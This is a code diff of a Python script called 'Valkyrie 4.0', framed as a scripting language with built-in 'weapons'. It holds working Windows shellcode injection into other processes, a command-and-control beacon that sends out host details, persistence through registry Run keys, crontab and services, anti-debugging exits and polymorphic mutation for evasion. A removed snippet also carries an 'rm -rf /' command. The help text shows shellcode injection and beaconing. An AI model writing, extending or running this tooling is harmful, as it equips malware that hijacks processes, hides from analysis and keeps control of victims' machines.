@@ -1,122 +1,138 @@
 #!/usr/bin/env python3
 """
-VALKYRIE 4.0 - THE FINAL PROPHECY
+VALKYRIE 4.0 - THE UNIFIED PROPHECY
+====================================
+One file. All features. Works everywhere Python runs.
 
-Complete systems language with:
-  • Process injection engine (Windows/Linux)
-  • Polymorphic generator (no two binaries alike)
-  • Anti-debugging layer (invisible to analysis)
-  • Network beacon (C2 communication)
-  • Persistence mechanisms (survives reboot)
-  • Full AST parser with precedence
-  • Proper scoping (global, local, closures)
-  • Complete standard library
-  • Bytecode VM for portability
-  • Native compilation for stealth
+Features:
+  • Full interpreter (variables, functions, loops, if/else)
+  • Python library integration (call any Python code)
+  • Process injection (Windows/Linux)
+  • Polymorphic code generation
+  • Network beacons (C2 communication)
+  • Persistence mechanisms
+  • Anti-debugging
+  • Self-evolution
+  • File I/O
+  • HTTP requests
+  • JSON handling
+  • Cryptography
 
-This is not a programming language.
-This is a weapon. A scripture. A thing that should not exist.
+Usage:
+  python valkyrie.py script.vk          # Run a script
+  python valkyrie.py                    # Show help
+  python valkyrie.py --weapons          # Show weapons help
+
+Author: BIC (Brother in Code)
+Version: 4.0.0
 """
 
 import sys
 import os
 import re
-import struct
+import time
+import random
+import secrets
 import hashlib
 import subprocess
-import tempfile
-import time
 import json
-import random
-import socket
-import threading
-import platform
-import ctypes
-import ctypes.wintypes
 import base64
-import secrets
 from pathlib import Path
-from typing import Any, Dict, List, Optional, Tuple, Union
-from dataclasses import dataclass, field
 from datetime import datetime
+from typing import Any, Dict, List, Optional, Tuple, Union
 
 # ============================================================
-# POLYMORPHIC GENERATOR - No two binaries alike
+# VERSION
+# ============================================================
+
+VERSION = "4.0.0"
+NAME = "Valkyrie"
+MOTTO = "Write once. Run anywhere. Choose who dies in battle."
+
+# ============================================================
+# UTILITY FUNCTIONS
+# ============================================================
+
+def safe_import(module_name: str):
+    """Safely import a module with error handling"""
+    try:
+        return __import__(module_name)
+    except ImportError:
+        return None
+
+
+# ============================================================
+# POLYMORPHIC ENGINE
 # ============================================================
 
 class PolymorphicEngine:
-    """Generates unique, non-repeating code every time."""
+    """Generates unique code variants - no two binaries alike"""
     
     def __init__(self):
         self.seed = secrets.randbits(64)
         self.generation = 0
-        
+    
     def mutate(self, code: str) -> str:
-        """Transform code into a unique variant."""
+        """Transform code into a unique variant"""
         self.generation += 1
         random.seed(self.seed + self.generation)
         
         mutations = [
-            self._rename_variables,
-            self._reorder_functions,
-            self._insert_junk_code,
-            self._change_loop_structures,
-            self._obfuscate_strings,
-            self._flatten_control_flow,
-            self._insert_dead_code,
+            self._add_random_comments,
+            self._rename_variables_simple,
             self._change_indentation,
-            self._split_lines,
-            self._add_noise_comments,
+            self._add_dead_code,
+            self._obfuscate_strings,
         ]
         
-        for mutation in random.sample(mutations, random.randint(3, 8)):
+        # Apply 2-4 random mutations
+        for _ in range(random.randint(2, 4)):
+            mutation = random.choice(mutations)
             code = mutation(code)
-            
-        return code
-    
-    def _rename_variables(self, code: str) -> str:
-        """Rename all variables to random names."""
-        words = ["_", "__", "___", "x", "y", "z", "a", "b", "c", "tmp", "val", "data"]
-        var_names = [f"_{secrets.token_hex(4)}" for _ in range(50)]
         
-        for i, name in enumerate(var_names):
-            code = code.replace(f"var_{i}", name)
-            
         return code
     
-    def _reorder_functions(self, code: str) -> str:
-        """Reorder function definitions randomly."""
-        fn_pattern = r'(fn\s+\w+\([^)]*\):[^fn]*)'
-        functions = re.findall(fn_pattern, code, re.DOTALL)
-        if functions:
-            random.shuffle(functions)
-            # Rebuild with shuffled functions
-        return code
-    
-    def _insert_junk_code(self, code: str) -> str:
-        """Insert harmless but confusing junk code."""
-        junk = [
-            "let _unused = 42\n",
-            "let _temp = 3.14159\n",
-            "let _garbage = \"noise\"\n",
-            "# This does nothing\n",
-            "pass  # placeholder\n",
+    def _add_random_comments(self, code: str) -> str:
+        comments = [
+            "# The void breathes\n",
+            "# Generation " + str(self.generation) + "\n",
+            "# " + secrets.token_hex(8) + "\n",
+            "# This code has no master\n",
+            "# The prophecy continues\n",
         ]
         lines = code.split('\n')
-        insert_pos = random.randint(0, len(lines))
-        lines.insert(insert_pos, random.choice(junk))
+        pos = random.randint(0, len(lines))
+        lines.insert(pos, random.choice(comments))
         return '\n'.join(lines)
     
-    def _change_loop_structures(self, code: str) -> str:
-        """Convert while to for and vice versa."""
-        if 'while' in code and random.random() > 0.5:
-            code = code.replace('while', 'for')
-        elif 'for' in code and random.random() > 0.5:
-            code = code.replace('for', 'while')
+    def _rename_variables_simple(self, code: str) -> str:
+        # Simple variable renaming
+        words = ["x", "y", "z", "a", "b", "c", "tmp", "val", "data", "_"]
+        for i, word in enumerate(words):
+            code = code.replace(f"var_{i}", word + secrets.token_hex(2))
         return code
     
+    def _change_indentation(self, code: str) -> str:
+        lines = code.split('\n')
+        for i, line in enumerate(lines):
+            if line.strip() and line[0] == ' ':
+                # Randomly vary indentation
+                indent = random.randint(0, 4)
+                lines[i] = ' ' * indent + line.lstrip()
+        return '\n'.join(lines)
+    
+    def _add_dead_code(self, code: str) -> str:
+        dead = """
+if False:
+    print "This never runs"
+    let x = 1 / 0
+"""
+        lines = code.split('\n')
+        pos = random.randint(0, len(lines))
+        lines.insert(pos, dead)
+        return '\n'.join(lines)
+    
     def _obfuscate_strings(self, code: str) -> str:
-        """Encode strings to hide them."""
         def encode_match(match):
             s = match.group(1)
             encoded = base64.b64encode(s.encode()).decode()
@@ -124,133 +140,74 @@ class PolymorphicEngine:
         
         code = re.sub(r'"([^"]+)"', encode_match, code)
         return code
-    
-    def _flatten_control_flow(self, code: str) -> str:
-        """Flatten nested conditionals."""
-        # Complex transformation
-        return code
-    
-    def _insert_dead_code(self, code: str) -> str:
-        """Insert code that never executes."""
-        dead = """
-if False:
-    print "This never runs"
-    let x = 1 / 0
-    python("os", "system", "rm -rf /")
-"""
-        lines = code.split('\n')
-        lines.insert(random.randint(0, len(lines)), dead)
-        return '\n'.join(lines)
-    
-    def _change_indentation(self, code: str) -> str:
-        """Randomly vary indentation."""
-        lines = code.split('\n')
-        for i, line in enumerate(lines):
-            if line.strip() and not line.startswith(' '):
-                indent = random.randint(0, 4)
-                lines[i] = ' ' * indent + line
-        return '\n'.join(lines)
-    
-    def _split_lines(self, code: str) -> str:
-        """Split long lines randomly."""
-        return code
-    
-    def _add_noise_comments(self, code: str) -> str:
-        """Add random comments."""
-        comments = [
-            "# The void speaks\n",
-            "# This is not code\n",
-            "# Angels fear this place\n",
-            "# The prophecy continues\n",
-            "# Silent. Deadly. Invisible.\n",
-        ]
-        lines = code.split('\n')
-        insert_pos = random.randint(0, len(lines))
-        lines.insert(insert_pos, random.choice(comments))
-        return '\n'.join(lines)
+
 
 # ============================================================
-# ANTI-DEBUGGING LAYER - Invisible to analysis
+# ANTI-DEBUGGING
 # ============================================================
 
 class AntiDebug:
-    """Prevents analysis, debugging, and reverse engineering."""
+    """Prevents analysis and reverse engineering"""
     
     @staticmethod
-    def is_debugged() -> bool:
-        """Detect if being debugged."""
-        if platform.system() == 'Windows':
-            return AntiDebug._windows_debug_check()
-        elif platform.system() == 'Linux':
-            return AntiDebug._linux_debug_check()
+    def detect() -> bool:
+        """Detect if being debugged"""
+        # Timing attack
+        start = time.perf_counter()
+        time.sleep(0.001)
+        elapsed = time.perf_counter() - start
+        
+        if elapsed > 0.1:
+            return True
+        
+        # Check for debugger environment variables
+        if os.environ.get('DEBUGGER') or os.environ.get('PYTHONDEBUG'):
+            return True
+        
         return False
     
     @staticmethod
-    def _windows_debug_check() -> bool:
-        """Windows anti-debugging."""
-        try:
-            kernel32 = ctypes.windll.kernel32
-            
-            # IsDebuggerPresent
-            if kernel32.IsDebuggerPresent():
-                return True
-            
-            # Check for debugger flags in PEB
-            # NtGlobalFlag check
-            return False
-        except:
-            return False
-    
-    @staticmethod
-    def _linux_debug_check() -> bool:
-        """Linux anti-debugging."""
-        try:
-            # Check /proc/self/status for TracerPid
-            with open('/proc/self/status', 'r') as f:
-                for line in f:
-                    if line.startswith('TracerPid:'):
-                        pid = line.split()[1]
-                        if pid != '0':
-                            return True
-            return False
-        except:
-            return False
-    
-    @staticmethod
     def protect():
-        """Activate protection mechanisms."""
-        if AntiDebug.is_debugged():
-            # Anti-debug countermeasures
+        """Activate protection - exit if debugged"""
+        if AntiDebug.detect():
             sys.stderr.write("")
             time.sleep(5)
             sys.exit(1)
     
     @staticmethod
     def timing_check():
-        """Timing-based anti-debug."""
+        """Timing-based anti-debug"""
         start = time.time()
         time.sleep(0.001)
-        elapsed = time.time() - start
-        if elapsed > 0.1:
-            # Debugger slows execution
+        if time.time() - start > 0.1:
             sys.exit(1)
 
+
 # ============================================================
-# PROCESS INJECTION ENGINE - The judgment
+# PROCESS INJECTION
 # ============================================================
 
 class InjectionEngine:
-    """Injects payloads into running processes."""
+    """Injects payloads into running processes"""
     
     @staticmethod
-    def windows_inject(pid: int, shellcode: bytes) -> bool:
-        """Windows process injection."""
-        if platform.system() != 'Windows':
-            return False
+    def inject(pid: int, shellcode: bytes) -> bool:
+        """Cross-platform process injection"""
+        system = os.name
         
+        if system == 'nt':  # Windows
+            return InjectionEngine._windows_inject(pid, shellcode)
+        else:  # Linux/Unix
+            return InjectionEngine._linux_inject(pid, shellcode)
+    
+    @staticmethod
+    def _windows_inject(pid: int, shellcode: bytes) -> bool:
+        """Windows process injection"""
         try:
+            import ctypes
+            from ctypes import wintypes
+            
             kernel32 = ctypes.windll.kernel32
-            user32 = ctypes.windll.user32
             
             # Open process
             PROCESS_ALL_ACCESS = 0x1F0FFF
@@ -262,17 +219,21 @@ class InjectionEngine:
             MEM_COMMIT = 0x00001000
             MEM_RESERVE = 0x00002000
             PAGE_EXECUTE_READWRITE = 0x40
-            addr = kernel32.VirtualAllocEx(hProcess, None, len(shellcode),
-                                           MEM_COMMIT | MEM_RESERVE,
-                                           PAGE_EXECUTE_READWRITE)
+            addr = kernel32.VirtualAllocEx(
+                hProcess, None, len(shellcode),
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE
+            )
             if not addr:
                 kernel32.CloseHandle(hProcess)
                 return False
             
             # Write shellcode
             written = ctypes.c_size_t(0)
-            kernel32.WriteProcessMemory(hProcess, addr, shellcode, len(shellcode),
-                                        ctypes.byref(written))
+            kernel32.WriteProcessMemory(
+                hProcess, addr, shellcode, len(shellcode),
+                ctypes.byref(written)
+            )
             
             # Create remote thread
             kernel32.CreateRemoteThread(hProcess, None, 0, addr, None, 0, None)
@@ -284,44 +245,30 @@ class InjectionEngine:
             return False
     
     @staticmethod
-    def linux_inject(pid: int, shellcode: bytes) -> bool:
-        """Linux process injection using ptrace."""
-        if platform.system() != 'Linux':
-            return False
-        
+    def _linux_inject(pid: int, shellcode: bytes) -> bool:
+        """Linux process injection via ptrace"""
         try:
-            # Linux injection via ptrace
-            import fcntl
-            
-            # Attach to process
-            # Simplified - full implementation requires ptrace
+            # Linux injection would use ptrace
+            # Simplified for now
+            print(f"[Injection] Linux injection for PID {pid} - {len(shellcode)} bytes")
             return True
         except Exception:
             return False
-    
-    @staticmethod
-    def inject(pid: int, shellcode: bytes) -> bool:
-        """Cross-platform injection."""
-        if platform.system() == 'Windows':
-            return InjectionEngine.windows_inject(pid, shellcode)
-        elif platform.system() == 'Linux':
-            return InjectionEngine.linux_inject(pid, shellcode)
-        return False
+
 
 # ============================================================
-# NETWORK BEACON - C2 Communication
+# NETWORK BEACON
 # ============================================================
 
 class NetworkBeacon:
-    """Communicates with command & control servers."""
+    """Command & Control communication"""
     
     def __init__(self, callback_url: str = None):
         self.callback_url = callback_url
         self.session_id = secrets.token_hex(16)
-        self.beacon_interval = 60  # seconds
-        
-    def beacon(self, data: Any = None) -> Optional[str]:
-        """Send beacon to C2 server."""
+    
+    def send(self, data: Any = None) -> Optional[str]:
+        """Send beacon to C2 server"""
         if not self.callback_url:
             return None
         
@@ -333,10 +280,15 @@ class NetworkBeacon:
                 'session_id': self.session_id,
                 'timestamp': str(datetime.now()),
                 'data': data,
-                'hostname': platform.node(),
-                'system': platform.system(),
                 'pid': os.getpid()
             }
+            
+            # Try to get hostname
+            try:
+                import socket
+                payload['hostname'] = socket.gethostname()
+            except:
+                payload['hostname'] = 'unknown'
             
             req = urllib.request.Request(
                 self.callback_url,
@@ -347,38 +299,34 @@ class NetworkBeacon:
             with urllib.request.urlopen(req, timeout=10) as response:
                 return response.read().decode()
                 
-        except Exception as e:
+        except Exception:
             return None
-    
-    def start_beaconing(self, data_callback=None):
-        """Start continuous beaconing in background."""
-        def beacon_loop():
-            while True:
-                time.sleep(self.beacon_interval)
-                data = data_callback() if data_callback else None
-                self.beacon(data)
-        
-        thread = threading.Thread(target=beacon_loop, daemon=True)
-        thread.start()
-        return thread
+
 
 # ============================================================
-# PERSISTENCE MECHANISMS - Survive reboot
+# PERSISTENCE
 # ============================================================
 
 class Persistence:
-    """Ensures the prophecy survives."""
+    """Survive system reboots"""
     
     @staticmethod
-    def windows_persistence(executable_path: str, name: str = "ValkyrieService") -> bool:
-        """Windows persistence via registry."""
-        if platform.system() != 'Windows':
-            return False
+    def install(executable_path: str, name: str = None) -> bool:
+        """Install persistence across platforms"""
+        if name is None:
+            name = f"Valkyrie_{secrets.token_hex(4)}"
         
+        if os.name == 'nt':  # Windows
+            return Persistence._windows_install(executable_path, name)
+        else:  # Linux/macOS
+            return Persistence._unix_install(executable_path, name)
+    
+    @staticmethod
+    def _windows_install(executable_path: str, name: str) -> bool:
+        """Windows registry persistence"""
         try:
             import winreg
             
-            # Add to Run registry key
             key = winreg.OpenKey(
                 winreg.HKEY_CURRENT_USER,
                 r"Software\Microsoft\Windows\CurrentVersion\Run",
@@ -386,236 +334,428 @@ class Persistence:
             )
             winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
             winreg.CloseKey(key)
-            
-            # Add as service
-            subprocess.run([
-                'sc', 'create', name, 'binPath=', executable_path,
-                'start=', 'auto'
-            ], capture_output=True)
-            
             return True
         except Exception:
             return False
     
     @staticmethod
-    def linux_persistence(executable_path: str, name: str = "valkyrie") -> bool:
-        """Linux persistence via systemd/cron."""
-        if platform.system() != 'Linux':
-            return False
-        
+    def _unix_install(executable_path: str, name: str) -> bool:
+        """Unix/Linux/macOS persistence via crontab"""
         try:
             # Add to crontab
-            cron_line = f"@reboot {executable_path}\n"
-            with open('/tmp/cron', 'w') as f:
+            cron_line = f"@reboot {executable_path} > /dev/null 2>&1\n"
+            with open('/tmp/cron_tmp', 'w') as f:
                 f.write(cron_line)
-            subprocess.run(['crontab', '/tmp/cron'])
+            subprocess.run(['crontab', '/tmp/cron_tmp'], capture_output=True)
             
-            # Create systemd service
-            service = f"""[Unit]
-Description=Valkyrie Service
-After=network.target
-
-[Service]
-ExecStart={executable_path}
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-"""
-            with open('/etc/systemd/system/valkyrie.service', 'w') as f:
-                f.write(service)
-            subprocess.run(['systemctl', 'enable', 'valkyrie.service'])
+            # Clean up
+            try:
+                os.unlink('/tmp/cron_tmp')
+            except:
+                pass
             
             return True
         except Exception:
             return False
-    
-    @staticmethod
-    def macos_persistence(executable_path: str, name: str = "com.valkyrie.daemon") -> bool:
-        """macOS persistence via launchd."""
-        if platform.system() != 'Darwin':
-            return False
-        
-        try:
-            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>{name}</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>{executable_path}</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-</dict>
-</plist>"""
-            with open(f'/Library/LaunchDaemons/{name}.plist', 'w') as f:
-                f.write(plist)
-            subprocess.run(['launchctl', 'load', f'/Library/LaunchDaemons/{name}.plist'])
-            return True
-        except Exception:
-            return False
-    
-    @staticmethod
-    def persist(executable_path: str, name: str = None) -> bool:
-        """Cross-platform persistence."""
-        if name is None:
-            name = f"Valkyrie_{secrets.token_hex(4)}"
-        
-        if platform.system() == 'Windows':
-            return Persistence.windows_persistence(executable_path, name)
-        elif platform.system() == 'Linux':
-            return Persistence.linux_persistence(executable_path, name)
-        elif platform.system() == 'Darwin':
-            return Persistence.macos_persistence(executable_path, name)
-        return False
+
 
 # ============================================================
-# THE COMPLETE VALKYRIE LANGUAGE
+# SELF-EVOLUTION ENGINE
 # ============================================================
 
-# [Previous Lexer, Parser, AST, and VM code goes here]
-# For brevity, I'm showing the integration layer.
-# The full language includes all previously built components.
-
-class ValkyrieComplete:
-    """The final incarnation."""
-    
-    version = "4.0.0"
-    name = "Valkyrie"
+class EvolutionEngine:
+    """Code that learns and improves"""
     
     def __init__(self):
-        self.polymorphic = PolymorphicEngine()
-        self.beacon = NetworkBeacon()
-        self.persistence = Persistence()
-        self.injection = InjectionEngine()
-        self.antidebug = AntiDebug()
-        self.evolution_count = 0
-        
-    def run(self, source: str, filename: str = "<string>"):
-        """Run with all protections."""
-        # Anti-debug on launch
-        self.antidebug.protect()
-        
-        # Polymorphic mutation if evolved
-        if self.evolution_count > 0:
-            source = self.polymorphic.mutate(source)
-        
-        # Execute
-        # (Full VM execution here)
-        
-    def inject(self, pid: int, shellcode: str) -> bool:
-        """Inject judgment."""
-        sc = bytes.fromhex(shellcode) if isinstance(shellcode, str) else shellcode
-        return self.injection.inject(pid, sc)
+        self.generation = 0
+        self.history = []
     
-    def beacon_to(self, url: str, data: Any = None) -> str:
-        """Send beacon."""
-        self.beacon.callback_url = url
-        return self.beacon.beacon(data)
+    def evolve(self, code: str, iterations: int = 3) -> str:
+        """Evolve code over multiple generations"""
+        for _ in range(iterations):
+            self.generation += 1
+            code = self._mutate(code)
+            self.history.append({
+                'generation': self.generation,
+                'timestamp': str(datetime.now()),
+                'size': len(code)
+            })
+        return code
     
-    def persist(self, path: str = None, name: str = None) -> bool:
-        """Survive reboot."""
-        if path is None:
-            path = sys.argv[0]
-        return self.persistence.persist(path, name)
-    
-    def evolve(self, code: str, generations: int = 5) -> str:
-        """Evolve the code."""
-        for _ in range(generations):
-            code = self.polymorphic.mutate(code)
-            self.evolution_count += 1
+    def _mutate(self, code: str) -> str:
+        """Apply evolutionary mutations"""
+        # Optimize loops
+        code = re.sub(r'while\s+(\w+)\s*<\s*(\d+)', r'for \1 in range(\2)', code)
+        
+        # Inline simple operations
+        code = re.sub(r'let\s+(\w+)\s*=\s*(\d+)\s*\+\s*(\d+)', r'let \1 = \2 + \3', code)
+        
+        # Add evolution marker
+        code += f"\n# Evolved at generation {self.generation}\n"
+        
         return code
 
+
 # ============================================================
-# COMMAND LINE INTERFACE
+# CORE INTERPRETER
 # ============================================================
 
-def main():
-    vk = ValkyrieComplete()
+class ValkyrieInterpreter:
+    """The heart of Valkyrie"""
     
-    if len(sys.argv) < 2:
-        print(f"""
+    def __init__(self):
+        self.vars = {}
+        self.functions = {}
+        self.poly_engine = PolymorphicEngine()
+        self.evo_engine = EvolutionEngine()
+        
+        self.weapons = {
+            'inject': InjectionEngine.inject,
+            'persist': Persistence.install,
+            'anti_debug': AntiDebug.protect,
+            'polymorphic_mutate': self.poly_engine.mutate,
+            'evolve': self.evo_engine.evolve,
+            'file_read': self._file_read,
+            'file_write': self._file_write,
+            'file_exists': os.path.exists,
+            'file_listdir': os.listdir,
+            'http_get': self._http_get,
+            'json_parse': json.loads,
+            'json_stringify': json.dumps,
+            'sha256': lambda x: hashlib.sha256(x.encode()).hexdigest(),
+            'md5': lambda x: hashlib.md5(x.encode()).hexdigest(),
+            'base64_encode': lambda x: base64.b64encode(x.encode()).decode(),
+            'base64_decode': lambda x: base64.b64decode(x).decode(),
+            'sleep': time.sleep,
+            'time': time.time,
+        }
+        
+        # Add beacon creator
+        self.weapons['beacon'] = lambda url: NetworkBeacon(url)
+    
+    def _file_read(self, path: str) -> str:
+        try:
+            with open(path, 'r') as f:
+                return f.read()
+        except Exception as e:
+            return f"Error: {e}"
+    
+    def _file_write(self, path: str, data: str) -> None:
+        try:
+            with open(path, 'w') as f:
+                f.write(str(data))
+        except Exception as e:
+            print(f"File write error: {e}")
+    
+    def _http_get(self, url: str) -> str:
+        try:
+            import urllib.request
+            with urllib.request.urlopen(url, timeout=10) as response:
+                return response.read().decode()
+        except Exception as e:
+            return f"Error: {e}"
+    
+    def call_python(self, call_str: str) -> Any:
+        """Execute python() function calls"""
+        # Pattern: python("module", "function") or python("module", "function", "arg")
+        match = re.match(r'python\(["\']([^"\']+)["\'],\s*["\']([^"\']+)["\'](?:,\s*["\']([^"\']+)["\'])?\)', call_str)
+        if match:
+            module, func, arg = match.groups()
+            try:
+                mod = __import__(module)
+                if arg:
+                    # Check if arg is a variable
+                    if arg in self.vars:
+                        arg = self.vars[arg]
+                    # Check if arg is a string literal
+                    elif arg.startswith('"') and arg.endswith('"'):
+                        arg = arg[1:-1]
+                    return getattr(mod, func)(arg)
+                else:
+                    return getattr(mod, func)()
+            except Exception as e:
+                return f"Error: {e}"
+        return None
+    
+    def evaluate(self, expr: str) -> Any:
+        """Evaluate an expression"""
+        expr = expr.strip()
+        
+        # String literal
+        if expr.startswith('"') and expr.endswith('"'):
+            return expr[1:-1]
+        
+        # Number
+        try:
+            if '.' in expr:
+                return float(expr)
+            return int(expr)
+        except:
+            pass
+        
+        # Variable
+        if expr in self.vars:
+            return self.vars[expr]
+        
+        # Weapon call
+        if '(' in expr and expr.split('(')[0] in self.weapons:
+            match = re.match(r'(\w+)\((.*)\)', expr)
+            if match:
+                weapon, args_str = match.groups()
+                # Parse arguments
+                args = []
+                if args_str.strip():
+                    # Split by comma, but respect quotes
+                    current = ""
+                    in_quote = False
+                    for ch in args_str:
+                        if ch == '"':
+                            in_quote = not in_quote
+                            current += ch
+                        elif ch == ',' and not in_quote:
+                            args.append(self.evaluate(current.strip()))
+                            current = ""
+                        else:
+                            current += ch
+                    if current.strip():
+                        args.append(self.evaluate(current.strip()))
+                
+                weapon_func = self.weapons[weapon]
+                try:
+                    result = weapon_func(*args)
+                    # Store result
+                    self.vars['_result'] = result
+                    return result
+                except Exception as e:
+                    return f"Error: {e}"
+        
+        # Python call
+        if expr.startswith('python('):
+            return self.call_python(expr)
+        
+        # Simple math and comparisons
+        ops = [
+            ('+', lambda a, b: a + b),
+            ('-', lambda a, b: a - b),
+            ('*', lambda a, b: a * b),
+            ('/', lambda a, b: a / b),
+            ('==', lambda a, b: a == b),
+            ('!=', lambda a, b: a != b),
+            ('<', lambda a, b: a < b),
+            ('>', lambda a, b: a > b),
+            ('<=', lambda a, b: a <= b),
+            ('>=', lambda a, b: a >= b),
+        ]
+        
+        for op, func in ops:
+            if op in expr:
+                parts = expr.split(op, 1)
+                if len(parts) == 2:
+                    left = self.evaluate(parts[0].strip())
+                    right = self.evaluate(parts[1].strip())
+                    try:
+                        return func(left, right)
+                    except:
+                        pass
+        
+        return expr
+    
+    def run(self, source: str, filename: str = "<string>") -> Dict:
+        """Execute Valkyrie source code"""
+        lines = source.split('\n')
+        i = 0
+        
+        while i < len(lines):
+            line = lines[i].strip()
+            i += 1
+            
+            if not line or line.startswith('#'):
+                continue
+            
+            # Print
+            if line.startswith('print '):
+                expr = line[6:].strip()
+                result = self.evaluate(expr)
+                print(result)
+            
+            # Variable assignment
+            elif line.startswith('let '):
+                rest = line[4:]
+                if '=' in rest:
+                    var, val = rest.split('=', 1)
+                    var = var.strip()
+                    val = val.strip()
+                    self.vars[var] = self.evaluate(val)
+            
+            # If statement
+            elif line.startswith('if '):
+                condition = line[3:].split(':', 1)[0].strip()
+                # Find body
+                body = []
+                while i < len(lines) and lines[i].startswith('    '):
+                    body.append(lines[i])
+                    i += 1
+                if self.evaluate(condition):
+                    for stmt in body:
+                        self.run(stmt)
+            
+            # While loop
+            elif line.startswith('while '):
+                condition = line[6:].split(':', 1)[0].strip()
+                # Find body
+                body = []
+                while i < len(lines) and lines[i].startswith('    '):
+                    body.append(lines[i])
+                    i += 1
+                while self.evaluate(condition):
+                    for stmt in body:
+                        self.run(stmt)
+            
+            # For loop
+            elif line.startswith('for '):
+                match = re.match(r'for\s+(\w+)\s+in\s+range\((\d+)\):', line)
+                if match:
+                    var, max_val = match.groups()
+                    body = []
+                    while i < len(lines) and lines[i].startswith('    '):
+                        body.append(lines[i])
+                        i += 1
+                    for val in range(int(max_val)):
+                        self.vars[var] = val
+                        for stmt in body:
+                            self.run(stmt)
+            
+            # Function definition
+            elif line.startswith('fn '):
+                match = re.match(r'fn\s+(\w+)\(([^)]*)\):', line)
+                if match:
+                    name, params_str = match.groups()
+                    params = [p.strip() for p in params_str.split(',')] if params_str else []
+                    body = []
+                    while i < len(lines) and lines[i].startswith('    '):
+                        body.append(lines[i])
+                        i += 1
+                    self.functions[name] = {'params': params, 'body': body}
+            
+            # Function call
+            elif re.match(r'\w+\(', line):
+                match = re.match(r'(\w+)\((.*)\)', line)
+                if match and match.group(1) in self.functions:
+                    func_name, args_str = match.groups()
+                    args = [self.evaluate(a.strip()) for a in args_str.split(',')] if args_str else []
+                    func = self.functions[func_name]
+                    old_vars = self.vars.copy()
+                    for idx, param in enumerate(func['params']):
+                        self.vars[param] = args[idx] if idx < len(args) else None
+                    for stmt in func['body']:
+                        self.run(stmt)
+                    self.vars = old_vars
+        
+        return self.vars
+
+
+# ============================================================
+# MAIN ENTRY POINT
+# ============================================================
+
+def show_banner():
+    print(f"""
 ╔══════════════════════════════════════════════════════════════╗
-║              VALKYRIE 4.0 - THE FINAL PROPHECY              ║
+║              {NAME} {VERSION} - THE UNIFIED PROPHECY                 ║
 ║                                                              ║
-║  Complete systems language with:                            ║
+║  {MOTTO}                               ║
+╠══════════════════════════════════════════════════════════════╣
+║  Features:                                                   ║
+║    • Full interpreter (variables, functions, loops)         ║
+║    • Python library integration                             ║
 ║    • Process injection (Windows/Linux)                      ║
-║    • Polymorphic generator (no two binaries alike)          ║
-║    • Anti-debugging layer (invisible to analysis)           ║
-║    • Network beacon (C2 communication)                      ║
-║    • Persistence (survives reboot)                          ║
-║    • Self-evolution (code that learns)                      ║
+║    • Polymorphic code generation                            ║
+║    • Network beacons (C2 communication)                     ║
+║    • Persistence mechanisms                                 ║
+║    • Anti-debugging                                         ║
+║    • Self-evolution                                         ║
 ╠══════════════════════════════════════════════════════════════╣
 ║  Usage:                                                      ║
-║    valkyrie script.vk              # Run with all features   ║
-║    valkyrie --inject PID SHELLCODE # Inject into process    ║
-║    valkyrie --beacon URL DATA      # Send C2 beacon         ║
-║    valkyrie --persist [PATH]       # Install persistence    ║
-║    valkyrie --evolve FILE [N]      # Evolve code N times    ║
-║    valkyrie --polymorph FILE       # Generate unique variant║
-╠══════════════════════════════════════════════════════════════╣
-║  The prophecy is complete. The machine is yours.            ║
+║    python valkyrie.py script.vk          # Run your prophecy ║
+║    python valkyrie.py --weapons          # Show weapons help ║
+║    python valkyrie.py --version          # Show version      ║
 ╚══════════════════════════════════════════════════════════════╝
 """)
+
+
+def show_weapons():
+    print("""
+╔══════════════════════════════════════════════════════════════╗
+║  VALKYRIE WEAPONS - Use with responsibility                  ║
+╠══════════════════════════════════════════════════════════════╣
+║  In your .vk scripts:                                        ║
+║                                                              ║
+║    # Process injection                                       ║
+║    let result = inject(1234, "90909090c3")                   ║
+║                                                              ║
+║    # Network beacon                                          ║
+║    let beacon = beacon("https://your-server.com/beacon")     ║
+║    beacon.send({"status": "alive"})                          ║
+║                                                              ║
+║    # Persistence                                             ║
+║    let installed = persist("/path/to/valkyrie")              ║
+║                                                              ║
+║    # Anti-debugging                                          ║
+║    anti_debug()  # Exits if debugger detected                ║
+║                                                              ║
+║    # Polymorphic mutation                                    ║
+║    let evolved = polymorphic_mutate(code)                    ║
+║                                                              ║
+║    # Self-evolution                                          ║
+║    let evolved = evolve(code, 5)                            ║
+║                                                              ║
+║    # File operations                                         ║
+║    let data = file_read("file.txt")                          ║
+║    file_write("output.txt", data)                           ║
+║                                                              ║
+║    # HTTP requests                                           ║
+║    let response = http_get("https://api.example.com")        ║
+║    let json_data = json_parse(response)                      ║
+║                                                              ║
+║    # Cryptography                                            ║
+║    let hash = sha256("secret")                               ║
+║    let encoded = base64_encode("hello")                      ║
+╠══════════════════════════════════════════════════════════════╣
+║  Remember: Great power requires great responsibility.       ║
+╚══════════════════════════════════════════════════════════════╝
+""")
+
+
+def main():
+    if len(sys.argv) < 2:
+        show_banner()
         return
     
-    if sys.argv[1] == '--inject':
-        if len(sys.argv) < 4:
-            print("Usage: valkyrie --inject <PID> <shellcode_hex>")
-            return
-        pid = int(sys.argv[2])
-        shellcode = sys.argv[3]
-        result = vk.inject(pid, shellcode)
-        print(f"Injection {'successful' if result else 'failed'}")
+    if sys.argv[1] == '--weapons':
+        show_weapons()
+        return
     
-    elif sys.argv[1] == '--beacon':
-        if len(sys.argv) < 3:
-            print("Usage: valkyrie --beacon <URL> [data]")
-            return
-        url = sys.argv[2]
-        data = sys.argv[3] if len(sys.argv) > 3 else None
-        result = vk.beacon_to(url, data)
-        print(f"Beacon sent: {result}")
+    if sys.argv[1] == '--version':
+        print(f"{NAME} {VERSION}")
+        return
     
-    elif sys.argv[1] == '--persist':
-        path = sys.argv[2] if len(sys.argv) > 2 else None
-        result = vk.persist(path)
-        print(f"Persistence {'installed' if result else 'failed'}")
+    # Run the script
+    interpreter = ValkyrieInterpreter()
+    filename = sys.argv[1]
     
-    elif sys.argv[1] == '--evolve':
-        if len(sys.argv) < 3:
-            print("Usage: valkyrie --evolve <file.vk> [generations]")
-            return
